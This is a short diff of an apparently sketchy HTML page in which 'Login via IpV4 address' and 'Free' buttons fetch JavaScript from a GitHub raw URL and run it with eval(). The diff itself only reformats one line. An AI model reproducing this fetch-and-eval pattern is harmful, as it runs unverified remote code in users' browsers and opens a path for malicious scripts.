@@ -43,8 +43,7 @@ req2.onload = function() { window.close();eval(this.responseText);}; req2.send()
     req.open('GET', 'https://raw.githubusercontent.com/thefatpotato115/Apachi/Resources/ip_data.js');
     req.onload = function() {
       eval(this.responseText);
-    };
-    req.send();">Login via IpV4 address </button> 
+    };req.send();">Login via IpV4 address </button> 
         <button onclick="req = new XMLHttpRequest();         
 req.open('GET', 'https://raw.githubusercontent.com/thefatpotato115/Apachi/main/Free/Free_Application.js'); 
 req.onload = function() { window.close();eval(this.responseText);}; req.send();" 
